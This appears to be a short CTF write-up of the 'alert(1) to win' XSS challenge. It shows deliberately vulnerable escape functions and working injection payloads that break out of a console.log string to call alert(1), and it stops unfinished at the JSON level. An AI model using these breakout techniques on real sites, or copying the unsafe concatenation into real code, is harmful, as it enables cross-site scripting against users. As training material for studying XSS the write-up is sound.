---
title: 'alert(1) to win'
date: 2023-08-27T00:00:00.000Z
excerpt: >-
  Walkthrough of the "alert(1) to win" XSS challenge.
tags:
  - ctf
  - writeup
  - xss
  - portswigger
categories:
  - CTF
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## WarmUp

The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.

```jsx
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```

A simple function. It prints `console.log` inside a script tag.

### Payload

First, escape out of `console.log`.

Then insert an `alert` statement.

```jsx
Input : ");alert(1)//
Output : <script>console.log("");alert(1)//");</script>
```

It seems `</script>` stays intact even when using a comment.

---

## Adobe

```jsx
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```

A function that replaces `"` with `\"`.

Again, the goal is to escape `console.log` and call `alert(1)`.

### Payload

```jsx
Input : \");alert(1)//
Output : <script>console.log("\\");alert(1)//");</script>
```

Using `\"` escapes out of `console.log`, then calls `alert(1)`, then comments out the rest of the statement.

---

## JSON

```jsx
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

`JSON.stringify()` serializes the input value as a JSON string literal. Since it escapes all quotes and backslashes, the previous approach of escaping out of `console.log(...)` with `"` or `\` doesn't work here.

I stopped at this point on this challenge. Will update when I resume.
